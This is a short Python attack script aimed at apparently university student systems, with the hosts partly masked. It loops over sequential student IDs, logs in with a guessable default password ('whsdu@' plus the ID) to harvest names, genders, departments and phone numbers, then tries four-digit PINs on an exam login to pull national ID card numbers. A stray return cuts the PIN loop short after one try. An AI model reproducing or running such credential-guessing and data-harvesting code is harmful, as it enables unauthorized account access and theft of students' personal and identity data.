#Author:Singularity0909
import time
import requests

url_check = 'https://******.cn/mobile/rpc?p=/v2/login/login'
url_exam = 'http://60.***.**.53:80**/**_servers/user/login/loginByNameAndKsno'
#Faked

def getId(sid, name):
    for num in range(10000):
        password = str(num)
        length = len(password)
        for i in range(4 - length): #solve the password if possible
            password = '0' + password
        json = {
            'ksno': sid,
            'name': name,
            'password': password
        }
        r = requests.post(url_exam, json=json)
        json = r.json()
        if (json.get('message') != '密码输入有误！'):
            return json.get('content').get('student').get('idCard')
        return None  # try once


def getInfo(sid):
    password = 'whsdu@' + sid
    json = {
        "jsonrpc": "2.0",
        "method": "/v2/login/login",
        "id": 1,
        "params": [sid, password, False]
    }
    r = requests.post(url_check, json=json)
    json = r.json()
    if ('error' in json):
        return None
    name = json.get('result').get('display_name')
    gender = json.get('result').get('sex').get('display_name')
    clas = json.get('result').get('department').get('display_name')
    mobile = json.get('result').get('mobile')
    id = getId(sid, name)
    return sid, name, gender, clas, mobile, id


if __name__ == '__main__':
    for num in range(10002, 10358):
        sid = '2019008' + str(num)
        print(getInfo(sid))
